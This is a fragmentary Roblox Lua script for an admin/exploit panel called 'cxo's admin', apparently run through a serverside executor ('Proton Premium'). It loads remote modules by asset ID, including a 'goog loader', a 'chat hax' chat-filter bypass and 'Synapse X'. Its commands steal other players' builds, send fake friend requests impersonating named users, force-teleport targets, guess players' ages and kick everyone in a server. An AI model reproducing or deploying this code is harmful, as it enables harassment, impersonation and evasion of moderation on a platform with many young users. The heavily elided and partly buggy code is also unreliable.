-- cxocxocxocxocxocxocxocxocxocxocoxzcozxcozxcozxoczxocxzofdyhgbufguyhdfyhgbdfuhbgdfgdfgdf --

--[[

	cxo was here
	dekryptionite was here
	kozy was here
	vecko was here
	tech was here
	dionte was here
...
local restrictedmode = true

if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
	require(112691275102014).load() -- goog loader
end

function restrictcheck(v)
	if v and v.UserId then
		if v.UserId == 3222470105 or v.UserId == 1889958 or 1027223614 then
...
_G.Whitelist = GetWhitelist(cxoURL)
local TempWhitelist = GetWhitelist(cxoURL2)
...
function gui(plr, section)
		...
		for i, player in ipairs(game.Players:GetPlayers()) do
			...
			task.spawn(function()
				...
				if code:upper() == "XK" then
					flag = "🏳️" -- kosovo aint got a flag (Korabi: Why do i not have a flag!?)
				end
			...
			pings[player.Name] = task.spawn(function()
				while player and player.Parent == game.Players do
					...
					local hiddencheck = table.find(hidden, player.UserId) and "👻" or ""
					local whitelistcheck = (table.find(_G.Whitelist, tostring(player.UserId)) or table.find(TempWhitelist, player.UserId)) and "👑" or ""
					local goog = googul[player.UserId] or "❓"
	...
	if not goog then
		...
		notfi(sender, "cxo's admin", "goog failed to be added, command can not continue")
		return
	end
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		...
		if table.find(countrybanned, country) then
			...
			notfi(sender, "cxo's admin", "That country is not banned. Did you enter the name correctly?")
		end
	end
})
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		...
		if option ~= "true" and option ~= "false" then
			notfi(sender, "cxo's admin", "The values are true or false! example: ".. prefix .."agelock true 30")
		end
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			...
			require(87631077502363).load("Shiftlock")
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		...
		if id == "" or id == nil then
			notfi(sender, "cxo's admin", "You need to provide a game id!")
			return
		end
		...
		for i, plr in ipairs(targets) do
			...
			if table.find(_G.Whitelist, tostring(plr.UserId)) and restrictcheck(sender) then
				notfi(sender, "cxo's admin", "You cant forcetp this player due to crosswoods!")
				return
			end
			...
			if fail then
				notfi(sender, "cxo's admin", "Failed to teleport ".. plr.Name .." to ".. id .." | ".. fail)
			end

			task.spawn(function()
				task.wait(5)
				if game.Players:FindFirstChild(plr.Name) then
					notfi(sender, "cxo's admin", "Player failed to teleport, they might not be old enough to join the experience.")
				end
			end)
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			...
			if success then
				if #chat > 0 then
					notfi(sender, "cxo's admin", plr.Name .." is most likely 13+")
				else
					notfi(sender, "cxo's admin", plr.Name .." is most likely <13")
				end
			end
...
addcmd({ -- Requested by punchy39, he gave da anim code
	...
	Function = function(sender, targets, arguments)
		if not restrictcheck(sender) then
			...
			notfi(sender, "cxo's admin", "restricted mode is enabled, this command can't be used.")
		end
	end
})
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			...
			local success, err = pcall(function()
				require(87631077502363).load("Chat UI")
			end)

			if err then
				notfi(sender, "cxo's admin", "Chat UI failed to load")
			else
				if plr.PlayerGui then
					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("Chat UI"):Clone().Parent = plr.PlayerGui
				else
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			...
			local success, err = pcall(function()
				require(87631077502363).load("cxo's chat hax")
			end)

			if err then
				notfi(sender, "cxo's admin", "chat hax failed to load")
			else
				if plr.PlayerGui then
					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's chat hax"):Clone().Parent = plr.PlayerGui
				else
...
addcmd({
	Name = "logs",
	Aliases = {"cmdlogs", "adminlogs"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do

			if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("cxo's admin logs") then
				if plr.PlayerGui then
					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's admin logs"):Clone().Parent = plr.PlayerGui
				else
					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("ccxo's admin logs"):Clone().Parent = plr:WaitForChild("PlayerGui")
				end
				cxoLogger:add_listener(plr)
				return
			end

			local success, err = pcall(function()
				require(87631077502363).load("cxo's admin logs")
			end)

			if err then
				notfi(sender, "cxo's admin", "admin logs failed to load")
			else
				if plr.PlayerGui then
					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's admin logs"):Clone().Parent = plr.PlayerGui
					cxoLogger:add_listener(plr)
				else
					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's admin logs"):Clone().Parent = plr:WaitForChild("PlayerGui")
					cxoLogger:add_listener(plr)
				end
			end
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		...
		local success, err = pcall(function()
			require(87631077502363).load("Nexus")
		end)

		if err then
			notfi(sender, "cxo's admin", "Nexus failed to load")
			return
		end
	...
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				...
				require(87631077502363).load("AL")
				...
				GUI.AutoScan.MouseButton1Click:connect(function()
					if autoscan == false then autoscan = true
						...
						notfi(plr, "cxo's admin", "Auto Scan ENABLED")
					else autoscan = false
						GUI.AutoScan.BackgroundTransparency = 0
						notfi(plr, "cxo's admin", "Auto Scan DISABLED")
					end
				end)
...
addcmd({
	...
	Player = false,
	Function = function(sender, targets, arguments)
		game:GetService("TeleportService"):TeleportToPrivateServer(game.PlaceId, game:GetService("TeleportService"):ReserveServer(game.PlaceId), game.Players:GetPlayers(), nil, { softshutdowned = true, cxo = true })
		game.Players.PlayerAdded:Connect(function(v)
			repeat task.wait() until v and v.Character
			v:Kick("[cxo's admin]: This server was closed because someone triggered a new server creation.")
		end)
		task.wait(3.5)
		while task.wait() do
			for i,v in pairs(game.Players:GetPlayers()) do
				v:Kick("[cxo's admin]: Failed to teleport you to the restarted server, this may be due to the server being over the 8 player size limit. Please manually join the server")
			end
		end
	end
})
...
addcmd({
	...
	Function = function(sender, targets, arguments)
        ...
        if not success then
            notfi(sender, "cxo's admin", "Teleport failed:", err)
        end
	end
})
	...
	Function = function(sender, targets, arguments)
		...
		if response then
			...
			if success and gear then
				...
				notfi(sender, "cxo's admin", "Failed to insert the gear")
			end
		end
	end
})
			...
			if success and accessory then
				for i, plr in ipairs(targets) do
					...
					if hat and plr.Character then
						...
						notfi(sender, "cxo's admin", "Failed to insert the accessory")
					end
				end
			end
		end
			...
			if success and face then
				for i, plr in ipairs(targets) do
					...
					if decal and plr.Character and plr.Character:FindFirstChild("Head") then
						...
						notfi(sender, "cxo's admin", "Failed to insert the face")
					end
				end
			end
		end
			...
			if success and shirt then
				for i, plr in ipairs(targets) do
					...
					if texture and plr.Character then
						...
						notfi(sender, "cxo's admin", "Failed to insert the shirt")
					end
				end
			end
		end
			...
			if success and shirt then
				for i, plr in ipairs(targets) do
					...
					if texture and plr.Character then
						...
						notfi(sender, "cxo's admin", "Failed to insert the tshirt")
					end
				end
			end
		end
			...
			if success and pants then
				for i, plr in ipairs(targets) do
					...
					if texture and plr.Character and plr.Character:FindFirstChild("Head") then
						...
						notfi(sender, "cxo's admin", "Failed to insert the pants")
					end
				end
			end
		end
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		...
		if tonumber(slot) == 0 then
			...
			if success then
				notfi(sender, "cxo's admin", "Saved to ".. plr .."'s slot ".. slot .. "!")
			else
				notfi(sender, "cxo's admin", "Failed to save: ".. fail)
			end
		elseif tonumber(slot) > 0 then
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		...
		if success then
			notfi(sender, "cxo's admin", "Stole ".. target .."'s build (".. targetslot ..") and saved it to ".. plr .."'s slot (".. plrslot ..")")
		end

		if fail then
			notfi(sender, "cxo's admin", "Failed to steal ".. target .."'s build.")
		end
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local success, fail = pcall(function()
				require(5812973403).Halo(plr.Name)
			end)

			if fail then
				notfi(sender, "cxo's admin", "Halo failed to load: ".. fail)
			end
		end
	end
})
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			...
			if fail then
				notfi(sender, "cxo's admin", "sledge hammer failed to load: ".. fail)
			end
		end
	end
})
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			...
			notfi(plr, "cxo's admin", "Press G to explode.")
		end
	end
})
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			...
			if fail then
				notfi(sender, "cxo's admin", "minecraft failed to load: ".. fail)
			end
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			...
			if fail then
				notfi(sender, "cxo's admin", "tool gun failed to load: ".. fail)
			end
		end
	end
})
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local success, fail = pcall(function()
				return -- require(115021406772544).r(plr.Name)
			end)

			if fail then
				notfi(sender, "cxo's admin", "draw failed to load: ".. fail)
			end
		end
	end
})
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local success, fail = pcall(function()
				return -- require(115021406772544).r(plr.Name,"ben")
			end)

			if fail then
				notfi(sender, "cxo's admin", "ben failed to load: ".. fail)
			end
		end
	end
})
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local success, fail = pcall(function()
				return -- require(115021406772544).r(plr.Name,"tom")
			end)

			if fail then
				notfi(sender, "cxo's admin", "tom failed to load: ".. fail)
			end
		end
	end
})
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			...
			if fail then
				notfi(sender, "cxo's admin", "maxwell failed to load: ".. fail)
			end
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			...
			local success, fail = pcall(function()
				require(87631077502363).load("Kill Bot")
			end)

			if fail then
				notfi(sender, "cxo's admin", "kill bot failed to load: ".. fail)
			end
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			...
			local success, fail = pcall(function()
				require(87631077502363).load("Eerin")
			end)

			if fail then
				notfi(sender, "cxo's admin", "eerin failed to load: ".. fail)
			end
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			...
			if fail then
				notfi(sender, "cxo's admin", "mario failed to load: ".. fail)
				return
			end
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			...
			if fail then
				notfi(sender, "cxo's admin", "VRhands failed to load: ".. fail)
				return
			end
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			...
			if fail then
				notfi(sender, "cxo's admin", "Synapse X failed to load: ".. fail)
			end
		end
	end
})
	...
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			...
			if plr.PlayerGui then
				...
				notfi(sender, "cxo's admin", "Failed to give you the sound muter, You may hear sounds.")
			end
		...
		for i, plr in ipairs(targets) do
			if sender.UserId ~= 3222470105 then
				if sender.Name ~= plr.Name  then
					notfi(sender, "cxo's admin", "You can not unafk this player")
					return
				end
			end
			...
			if plr.PlayerGui then
				...
				notfi(sender, "cxo's admin", "Failed to give you the sound unmuter, You may not hear sounds.")
			end
...
addcmd({ -- kozy HATES indenting his code
	...
	Function = function(sender, targets, arguments)
		...
		if not _G.nanp or not _G.naned then
			return -- require(115021406772544).r("","poto")
		end
		...
		for i, plr in ipairs(targets) do
			...
			if table.find(_G.rworded, plr.Name) then
				...
				notfi(sender, "cxo's admin", "Kicked ".. plr.Name .." in ".. kicktime)
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		...
		for i = 5, 1, -1 do
			h.Text = "cxo's admin | Unloading in ".. i .." seconds"
			task.wait(1)
		end
		h:Destroy()
		...
		for i,v in pairs(game.Players:GetPlayers()) do
			if v.PlayerGui then 
				if v.PlayerGui:FindFirstChild("cxo's admin GUI") then
					v.PlayerGui:FindFirstChild("cxo's admin GUI"):Destroy()
				end
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		...
		if #arguments < 1 then
			notfi(sender, "cxo's admin", "You need to provide an ID!")
			return
		end
		...
		if success then
			...
			notfi(sender, "cxo's admin", "Failed to insert model. The model must be owned by the ROBLOX account to be elibile to insert.")
			return
		end
	end
})
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		...
		_G.filtermode = true
		notfi(sender, "cxo's admin", "You need to load exser and use the chatbypass so people can talk!")
	end
})
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		local success, fail = pcall(function()
			require(87631077502363).load("MainModule")
		end)
		
		if success then
			notfi(sender, "cxo's admin", "Loading!")
			_G.badwords = {}
			_G.filtermode = true
		else
			notfi(sender, "cxo's admin", "Failed to load Legacy Chat: ", fail)
			return
		end
	end
})]]
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("SFOTH") then
			local success, fail = pcall(function()
				require(87631077502363).load("SFOTH") -- sfoth4
			end)
			...
			if success then
				...
				notfi(sender, "cxo's admin", "SFOTH failed to load: ".. fail)
			end
		else
			workspace:ClearAllChildren()
			for i,v in pairs(game.Players:GetPlayers()) do
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		...
		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Lamborghini") then
			local success, fail = pcall(function()
				require(87631077502363).load("Lamborghini")
			end)
		...
		for i, plr in ipairs(targets) do
			...
			elseif setting == "seat" then
				if args ~= "true" and args ~= "false" then
					notfi(sender, "cxo's admin", "The values are true or false! example: ".. prefix .."vsettings ".. plr.Name .." seat true")
				end
	...
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if table.find(hidden, plr.UserId) then
				...
				plr:LoadCharacter()
				notfi(plr, "cxo's admin", "You have been unvanished! To fully reappear you must rejoin the server (".. prefix .."rejoin)")
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		...
		if success then
			...
			notfi(sender, "cxo's admin", "failed to retreieve user, is the name correct?")
			return
		end
		...
		if not _G.Jail then
			...
			if success then
				...
				if loaded then
					...
					notfi(sender, "cxo's admin", "Failed to load jail: " .. fail)
				end
			else
				notfi(sender, "cxo's admin", "Failed to load jail")
			end
		end
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		...
		if int <= 0 then
			notfi(sender, "cxo's admin", "You need to provide a number higher than 0!")
			return
		end

		if int > 1000 then
			notfi(sender, "cxo's admin", "Due to server crashing the limit is 1000")
			return
		end
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		...
		notfi(sender, "cxo's admin", "Whitelisted users: " .. whitelists, 7.5)
	end
})

addcmd({
	Name = "friend",
	Aliases = {"fakefriend", "friendrequest"},
	Function = function(sender, targets, arguments)
		name = table.concat(arguments, " ")
		displayname = nil
		headshot = nil
		...
		if success then
			...
			notfi(sender, "cxo's admin", "Error, failed to fetch ID of ".. name)
			return
		end

		if s then
			displayname = game:GetService("HttpService"):JSONDecode(r).displayName
			name = game:GetService("HttpService"):JSONDecode(r).name
		else
			notfi(sender, "cxo's admin", "Error, failed to fetch username / displayname")
			return
		end

		local c, x = pcall(function()
			return game.Players:GetUserThumbnailAsync(id, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
		end)

		if not c then
			notfi(sender, "cxo's admin", "Failed to get headshot of ".. name)
			return
		else
			headshot = x
		end
...
addcmd({
	Name = "friendbomb",
	Aliases = {"fakefriendbomb", "friendrequestbomb"},
	Function = function(sender, targets, arguments)

		local people = {
			"m_cv13" == "rbxthumb://type=AvatarHeadShot&id=308662004&w=420&h=420",
			"9jn" == "rbxthumb://type=AvatarHeadShot&id=22195028&w=420&h=420",
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		...
		require(112691275102014).load() -- goog l0ader
	end
})
...
addcmd({
	...
	Function = function(sender, targets, arguments)
		...
		local success, err = pcall(function()
			require(87631077502363).load("Command Bar")
		end)

		if err then
			notfi(sender, "cxo's admin", "Command bar failed to load: ", err)
		else
			if sender.PlayerGui then
				game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("Command Bar"):Clone().Parent = sender.PlayerGui
			else
...
-- Dekryptionite added these so if they break you can blame him
addcmd({
	Name = "oldmap",
	Aliases = {"2013map"},
	Function = function()
		...
		july2013map = require(79975359259173)
		july2013map:load()
...
cxoconnections["RemoteListener"] = function()
	...
	remote.OnServerEvent:Connect(function(player, choice, command, target, target2, extra, extra2)
		...
		if choice == "Reload" then
			...
			whatdasus = game.Players.ChildAdded:Connect(function(v)
				if v.Name == player.Name then
					...
					if err then
						notfi(plr, "cxo's admin", "IY FE failed to load")
					else
						if plr.Character then
							game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("IY"):Clone().Parent = plr.Character
						else
		...
		if choice == "chat" then
			...
			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(player, "cxo's admin", "goog failed to be added, command can not continue")
				return
			end
		...
		if choice == "PanelCMD" and table.find(panelanticheat, player.UserId) then
			...
			if not table.find(_G.Whitelist, tostring(player.UserId)) or table.find(TempWhitelist, player.UserId) then
				notfi(player, "cxo's admin", "You must be whitelisted to use this!")
				return
			end
...
cxoconnections["RemoteFListener"] = function()
	...
	local function GetFlag(code)
		if code:upper() == "XK" then
			return "🏳️" -- kosovo aint got a flag (Korabi: Why do i not have a flag!?)
		end
		...
		for i, part in pairs(parts) do
			if not part:FindFirstChild("maxwell") then
				...
				elseif game:GetService("ReplicatedStorage"):FindFirstChild("maxwell") then
					...
					require(87631077502363).load("maxwell")
		...
		for i, part in pairs(parts) do
			if not part:FindFirstChild("Doge") then
				...
				elseif game:GetService("ReplicatedStorage"):FindFirstChild("Doge") then
					...
					require(87631077502363).load("Doge")
		...
		for i, part in pairs(parts) do
			if not part:FindFirstChild("Ben") then
				...
				elseif game:GetService("ReplicatedStorage"):FindFirstChild("Ben") then
					...
					require(87631077502363).load("Ben")
		...
		for i, part in pairs(parts) do
			if not part:FindFirstChild("Tom") then
				...
				elseif game:GetService("ReplicatedStorage"):FindFirstChild("Tom") then
					...
					require(87631077502363).load("Tom")
		...
		for i, part in pairs(parts) do
			if not part:FindFirstChild("Burger") then
				...
				elseif game:GetService("ReplicatedStorage"):FindFirstChild("Burger") then
					...
					require(87631077502363).load("Burger")
		...
		for i, part in pairs(parts) do
			if not part:FindFirstChild("Cola") then
				...
				elseif game:GetService("ReplicatedStorage"):FindFirstChild("Cola") then
					...
					require(87631077502363).load("Cola")
		...
		for i, part in pairs(parts) do
			if not part:FindFirstChild("Fried Chicken") then
				...
				elseif game:GetService("ReplicatedStorage"):FindFirstChild("Fried Chicken") then
					...
					require(87631077502363).load("Fried Chicken")
		...
		for i, part in pairs(parts) do
			if not part:FindFirstChild("Chair") then
				...
				elseif game:GetService("ReplicatedStorage"):FindFirstChild("Chair") then
					...
					require(87631077502363).load("Chair")
...
cxoconnections["Removed"] = game:GetService("ReplicatedStorage").ChildRemoved:Connect(function(t)
	if t.Name == "cxo's folder" then
		...
		if not a:FindFirstChild("OrbScript") and not a:FindFirstChild("cxo's gmod remote") then
			...
			local cxologs = Instance.new("RemoteEvent", a)
			cxologs.Name = "cxoLogger"
		end
	end
end)
...
--print("Proton Premium Executed")
print(([[

8888888b.  8888888b.   .d88888b. 88888888888 .d88888b.  888b    888
888   Y88b 888   Y88b d88P" "Y88b    888    d88P" "Y88b 8888b   888
888    888 888    888 888     888    888    888     888 88888b  888
888   d88P 888   d88P 888     888    888    888     888 888Y88b 888
8888888P"  8888888P"  888     888    888    888     888 888 Y88b888
888        888 T88b   888     888    888    888     888 888  Y88888
888        888  T88b  Y88b. .d88P    888    Y88b. .d88P 888   Y8888
888        888   T88b  "Y88888P"     888     "Y88888P"  888    Y888
  
8888888b.  8888888b.  8888888888 888b     d888 8888888 888     888 888b     d888
888   Y88b 888   Y88b 888        8888b   d8888   888   888     888 8888b   d8888
888    888 888    888 888        88888b.d88888   888   888     888 88888b.d88888
888   d88P 888   d88P 8888888    888Y88888P888   888   888     888 888Y88888P888
8888888P"  8888888P"  888        888 Y888P 888   888   888     888 888 Y888P 888
888        888 T88b   888        888  Y8P  888   888   888     888 888  Y8P  888
888        888  T88b  888        888   "   888   888   Y88b. .d88P 888   "   888
888        888   T88b 8888888888 888       888 8888888  "Y88888P"  888       888

8888888888 Y88b   d88P 8888888888 .d8888b.  888     888 88888888888 8888888888 8888888b.
888         Y88b d88P  888       d88P  Y88b 888     888     888     888        888  "Y88b
888          Y88o88P   888       888    888 888     888     888     888        888    888
8888888       Y888P    8888888   888        888     888     888     8888888    888    888
888           d888b    888       888        888     888     888     888        888    888
888          d88888b   888       888    888 888     888     888     888        888    888
888         d88P Y88b  888       Y88b  d88P Y88b. .d88P     888     888        888  .d88P
8888888888 d88P   Y88b 8888888888 "Y8888P"   "Y88888P"      888     8888888888 8888888P"
